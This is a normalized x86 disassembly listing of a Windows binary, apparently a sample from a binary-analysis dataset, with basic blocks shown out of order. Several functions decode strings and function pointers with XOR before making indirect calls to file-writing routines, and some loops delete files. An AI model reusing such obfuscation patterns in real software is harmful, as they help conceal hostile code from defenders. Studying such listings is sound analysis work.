dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1005b520
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f798
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_100070c0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x4
call sub_1000a6f0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005b660
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_10064f60
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_1003b4a6
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_10065045
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_1003fdf0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_1002d250
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10016b90
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_1002d250
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10016b90
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10016b90
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_1002d250
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_1005b8c0
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
lea edx [ esi + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push r--data
push r--data
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
jns r-xdata
pop ebp
retn 0x4
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1005b900
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100424c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1005b930
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1005ac7e
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_100287d0
mov [ esi ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_1004dba0
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
sub_1005b9c0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0x54 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x5c ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0xe8 ]
call sub_1005e3c0
mov ecx [ ebp - 0x5c ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0x54 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0x50 ]
mov eax 0x16
mov [ ebp - 0x54 ] 0x0
call sub_1000a6f0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x58 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x60 ] ecx
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0x60 ]
lea ecx [ ebx + 0x104 ]
sar eax 0x1
push eax
push edx
call sub_1005e3c0
mov edx [ ebp - 0x58 ]
push edx
call edi
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebx + 0xf8 ]
push r--data
xor edi edi
lea ecx [ ebx + 0xe8 ]
mov [ ebp - 0x54 ] 0x0
call sub_1005e510
test eax eax
jne r-xdata
mov eax [ ebx + 0x114 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x104 ]
call sub_1005e510
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
xor ecx ebp
add eax 0x4
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1005bb7a
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003a58f
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1005bc17
push 0x30
mov eax sub_1007ef5e
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1001f288
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
push 0x10
pop edi
cmp [ ebp - 0x20 ] 0x10
mov ebx [ ebp - 0x34 ]
jae r-xdata
add edi edi
jmp r-xdata
dec esi
jne r-xdata
lea ebx [ ebp - 0x34 ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x34 ]
call sub_10050f80
cmp [ ebp - 0x20 ] 0x10
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
inc ebx
movzx eax [ ebx ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_1001c5c0
mov eax esi
call sub_10019c00
retn 0x20
sub_1005bce2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_1005bd40
push ebp
mov ebp esp
push 0xffffffff
push sub_10081fb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
call sub_100642c0
lea edi [ esi + 0x70 ]
xor eax eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] cx
mov [ ebp - 0x4 ] eax
mov ecx esi
mov [ esi ] r--data
call sub_10062fe0
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp - 0x10 ] edx
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push 0x60000000
push edi
call [ ebp - 0x10 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
mov [ ebp - 0x10 ] eax
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push edx
push edi
call [ ebp - 0x10 ]
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor ecx ecx
cmp [ ebp - 0x14 ] ebx
sete cl
mov [ esi + 0x8 ] ecx
sub_1005be50
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10040f60
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10040f60
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1005bf90
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1005bfe0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082831
mov eax [ fs : 0x0 ]
push eax
sub esp 0x310
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x308 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x320 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
mov [ esp + 0x34 ] ebx
cmp [ ebx + 0x8 ] eax
jne r-xdata
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x328 ] eax
mov esi [ ebx + 0xb4 ]
mov ecx [ ebx + 0xb8 ]
lea edi [ ebx + 0xb4 ]
mov [ esp + 0x18 ] eax
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x14 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax edi
mov ecx ebx
lea esi [ esp + 0x3c ]
call sub_10007560
xor eax eax
mov [ esp + 0x328 ] 0x2
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] eax
xor ebx ebx
mov ecx [ esp + 0x320 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x308 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x25
jb r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
lea edx [ esp + 0xb4 ]
push edx
lea ecx [ esp + 0xb4 ]
push ecx
call sub_10039230
add esp 0x8
lea ecx [ esp + 0x94 ]
lea edi [ esp + 0x20 ]
call sub_1003e740
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
mov eax [ eax ]
xor eax eax
nop
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
lea edi [ esp + 0x24 ]
lea esi [ esp + 0x40 ]
call sub_10032770
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov esi [ edi ]
mov ecx [ edi + 0x4 ]
inc [ esp + 0x18 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add ebx 0x1c
cmp [ esp + 0x18 ] eax
jb r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_10065045
add esp 0x4
inc eax
cmp eax 0x39
jb r-xdata
lea eax [ esp + 0x3c ]
mov [ esp + 0x328 ] 0x0
call sub_10054700
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov eax [ esp + 0x38 ]
cmp eax 0x1e84800
jge r-xdata
xor eax eax
xor ecx ecx
mov [ esp + 0xa8 ] 0x7
mov [ esp + 0xa4 ] eax
mov [ esp + 0x94 ] cx
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
push 0xffffffff
push eax
add esi ebx
push esi
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x334 ] 0x1
call sub_1001c310
xor eax eax
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
mov eax [ edi ]
add eax ebx
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ebx [ esp + 0x34 ]
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x24 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
lea edx [ esp + 0x18 ]
mov eax 0xae
call sub_1001bb80
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x124 ]
mov [ esp + 0x48 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
lea eax [ esp + 0x114 ]
call sub_1000c170
add esp 0x8
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x1c ]
mov ebx [ HeapFree@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x3c ]
mov [ esp + 0x328 ] 0x0
call sub_10054700
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov esi [ esp + 0x20 ]
cmp esi [ esp + 0x24 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
mov eax 0x3
jmp r-xdata
mov edi [ esp + 0x24 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax [ esp + 0x14 ]
mov esi [ eax ]
mov edi [ esp + 0x34 ]
mov ebx [ DeleteFileW@IAT ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x24 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi [ eax ]
mov ebx [ esp + 0x34 ]
cmp esi [ ebx + 0xb8 ]
je r-xdata
mov edx [ esi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
mov edi [ DeleteFileW@IAT ]
cmp [ esp + 0x30 ] 0x0
je r-xdata
mov edx [ esp + 0x30 ]
push edx
push ecx
call sub_100528d0
mov ebx eax
mov eax [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
lea esp [ esp ]
mov edx [ esp + 0x30 ]
push edx
push ecx
call sub_100528d0
mov ebx eax
mov eax [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ esp + 0x10c ]
push edx
call sub_10068660
test eax eax
lea eax [ esp + 0x10c ]
push eax
je r-xdata
xor eax eax
lea ebx [ ebx ]
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
mov ebx [ DeleteFileW@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
inc eax
cmp eax 0x14
jb r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call edi
add esi 0x1c
cmp esi [ ebx + 0xb8 ]
jne r-xdata
call ebx
xor eax eax
call ebx
xor eax eax
nop
inc eax
cmp eax 0x3b
jb r-xdata
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
inc eax
cmp eax 0x14
jb r-xdata
inc eax
cmp eax 0x3b
jb r-xdata
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
test eax eax
